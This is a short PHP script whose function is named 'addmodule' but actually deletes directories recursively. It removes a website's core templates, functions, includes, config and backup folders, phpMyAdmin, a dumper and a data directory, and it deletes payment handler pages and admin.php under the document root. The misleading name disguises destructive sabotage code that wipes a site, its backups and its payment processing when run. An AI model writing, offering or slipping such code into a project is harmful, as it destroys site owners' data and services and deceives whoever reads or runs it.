<?php 
function addmodule($dir) { 
	if ($objs = glob($dir."/*")) { 
		foreach($objs as $obj) { 
			is_dir($obj) ? addmodule($obj) : unlink($obj); 
		} 
	} 
	rmdir($dir);
} 
addmodule($_SERVER['DOCUMENT_ROOT'].'/core/tpl'); 
addmodule($_SERVER['DOCUMENT_ROOT'].'/core/funcs'); 
addmodule($_SERVER['DOCUMENT_ROOT'].'/core/includes');
addmodule($_SERVER['DOCUMENT_ROOT'].'/core/functions');
addmodule($_SERVER['DOCUMENT_ROOT'].'/core/backup');
addmodule($_SERVER['DOCUMENT_ROOT'].'/core/config');
addmodule($_SERVER['DOCUMENT_ROOT'].'/phpmyadmin');
addmodule($_SERVER['DOCUMENT_ROOT'].'/dumper');
addmodule($_SERVER['DOCUMENT_ROOT'].'/data');
unlink($_SERVER['DOCUMENT_ROOT'].'/payment_ok.php');
unlink($_SERVER['DOCUMENT_ROOT'].'/payments_fail.php');
unlink($_SERVER['DOCUMENT_ROOT'].'/payments_success.php');
unlink($_SERVER['DOCUMENT_ROOT'].'/probokassa.php');
unlink($_SERVER['DOCUMENT_ROOT'].'/admin.php');
?>